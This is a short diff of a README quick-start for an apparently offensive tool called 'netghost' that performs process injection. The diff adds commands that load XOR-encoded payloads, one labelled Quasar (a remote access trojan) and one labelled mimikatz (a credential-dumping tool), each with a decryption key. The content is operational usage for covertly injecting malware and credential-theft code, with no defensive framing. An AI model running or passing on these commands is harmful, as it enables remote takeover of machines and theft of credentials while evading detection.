@@ -1,4 +1,6 @@
-# Quick Start
+# Quick Start ghost process injection
 
-### ghost process injection
+### Quasar
 .\new_x64_netghost.exe --vxor .\cb.vxor 5A1F3C7E
+### mimikatz
+.\new_x64_netghost.exe --vxor .\mimi.vxor 5A1F3C7E
